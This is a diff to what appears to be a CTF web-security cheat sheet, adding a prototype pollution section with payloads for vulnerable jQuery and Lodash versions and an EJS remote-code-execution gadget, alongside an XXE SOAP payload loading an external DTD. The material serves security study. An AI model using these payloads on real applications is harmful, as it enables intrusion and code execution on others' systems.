@@ -9,6 +9,8 @@ Table of Contents
 *  [PHP Tag](#php-tag)
 *  [PHP Weak Type](#php-weak-type)
 *  [PHP Feature](#php-其他特性)
+    * [Bypass open\_basedir](#open_basedir繞過)
+    * [Bypass disable\_functions](#disable_functions繞過)
 *  [Command Injection](#command-injection)
     * [Bypass Space](#空白繞過)
     * [Bypass Keyword](#keyword繞過)
@@ -34,6 +36,7 @@ Table of Contents
 *  [SSTI](#ssti)
     * [Flask/Jinja2](#flaskjinja2)
     * [Twig/Symfony](#twig--symfony)
+    * [Thymeleaf](#thymeleaf)
     * [AngularJS](#angularjs)
     * [Vue.js](#vuejs)
     * [Python](#python)
@@ -733,7 +736,7 @@ echo file_get_contents('bar/etc/passwd');
     - PHP 7.4 feature
     - preloading + ffi
     - e.g. [RCTF 2019 - nextphp](https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/nextphp)
-- [Extension](https://github.com/w181496/FuckFastcgi)
+- [FastCGI Extension](https://github.com/w181496/FuckFastcgi)
 
 - Windows COM
     - 條件
@@ -756,7 +759,7 @@ echo file_get_contents('bar/etc/passwd');
     - 條件
         - 可以上傳 `.so`, `gconv-modules`
         - 可以設定環境變數
-    - `iconv()`, `iconv_strlen()`, php://filter的convert.iconv 
+    - `iconv()`, `iconv_strlen()`, php://filter的`convert.iconv`
 
 - [l3mon/Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)
 
@@ -2850,7 +2853,7 @@ xxe.dtd:
 
 ## SOAP
 
-```
+```xml
 <soap:Body>
 <foo>
 <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://kaibro.tw:22/"> %dtd;]><xxx/>]]>
@@ -2865,6 +2868,81 @@ xxe.dtd:
 - PPTX
 - PDF
 - https://github.com/BuffaloWill/oxml_xxe
+
+# Prototype Pollution
+
+```javascript
+goodshit = {}
+goodshit.__proto__.password = "ggininder"
+
+user = {}
+console.log(user.password)
+# => ggininder
+```
+
+```javascript
+let o1 = {}
+let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
+merge(o1, o2)
+console.log(o1.a, o1.b)
+# => 1 2
+
+o3 = {}
+console.log(o3.b)
+# => 2
+```
+
+## jQuery
+
+- CVE-2019-11358
+    - jQuery < 3.4.0
+    - `$.extend`
+
+    ```javascript
+    let a = $.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
+    console.log({}.devMode); // true
+    ```
+
+## Lodash
+
+- SNYK-JS-LODASH-608086
+    - versions < 4.17.17
+    - 觸發點: `setWith()`, `set()`
+    - Payload:
+        - `setWith({}, "__proto__[test]", "123")`
+        - `set({}, "__proto__[test2]", "456")`
+- CVE-2020-8203
+    - versions < 4.17.16
+    - 觸發點: `zipObjectDeep()`
+    - Payload: `zipObjectDeep(['__proto__.z'],[123])`
+        - `console.log(z)` => 123
+- CVE-2019-10744
+    - versions < 4.17.12
+    - 觸發點: `defaultsDeep()`
+    - Payload: `{"type":"test","content":{"prototype":{"constructor":{"a":"b"}}}}`
+    - Example: 
+        - [XNUCA 2019 Qualifier - HardJS](https://www.anquanke.com/post/id/185377)
+        - [RedPwn CTF 2019 - Blueprint](https://ctftime.org/writeup/16201)
+- CVE-2018-16487 / CVE-2018-3721
+    - versions < 4.17.11
+    - 觸發點: `merge()`, `mergeWith()`, `defaultsDeep()`
+
+    ```javascript
+    var _= require('lodash');
+    var malicious_payload = '{"__proto__":{"oops":"It works !"}}';
+    var a = {};
+    _.merge({}, JSON.parse(malicious_payload));
+    ```
+
+## Misc
+
+- https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf
+- https://github.com/BlackFan/client-side-prototype-pollution
+- https://github.com/msrkp/PPScan
+- EJS RCE
+    - `outputFunctionName`
+    - 直接拼接到模板執行
+    - 污染即可RCE: `Object.prototype.outputFunctionName = "x;process.mainModule.require('child_process').exec('touch pwned');x";`
 
 # Frontend
 
